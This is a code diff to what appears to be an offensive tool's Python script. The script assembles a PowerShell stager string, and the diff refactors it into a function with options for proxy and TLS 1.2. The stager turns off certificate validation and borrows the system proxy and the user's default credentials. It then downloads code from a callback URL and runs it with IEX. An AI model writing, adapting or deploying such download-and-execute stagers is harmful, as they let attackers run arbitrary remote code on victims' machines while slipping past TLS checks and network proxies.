@@ -93,15 +93,20 @@ ssl_tls12 = (
     "[Net.SecurityProtocolType]::Tls12;"
 )
 
-stager_str = (
-    (
-        ssl_tls12 +
-        "[System.Net.ServicePointManager]::ServerCertificateValidationCallback"
-        "={$true};" if args.SSL_KEY else ""
-    ) + (
-        "$K=new-object net.webclient;"
-        "$K.proxy=[Net.WebRequest]::GetSystemWebProxy();"
-        "$K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;"
-        "IEX $K.downloadstring('%s0');"
-    ) % callback_url
-)
+
+def stager_str(need_proxy=True, need_tlsv12=(args.SSL_KEY is not None)):
+    result = ""
+    if args.SSL_KEY:
+        result += ("[System.Net.ServicePointManager]::ServerCertificate"
+                   "ValidationCallback={$true};")
+        if need_tlsv12:
+            result += ("[Net.ServicePointManager]::SecurityProtocol="
+                       "[Net.SecurityProtocolType]::Tls12;")
+    result += "$K=new-object net.webclient;"
+    if need_proxy:
+        result += ("$K.proxy=[Net.WebRequest]::GetSystemWebProxy();"
+                   "$K.Proxy.Credentials=[Net.CredentialCache]::"
+                   "DefaultCredentials;")
+
+    result += "IEX $K.downloadstring('%s0');"
+    return result % callback_url
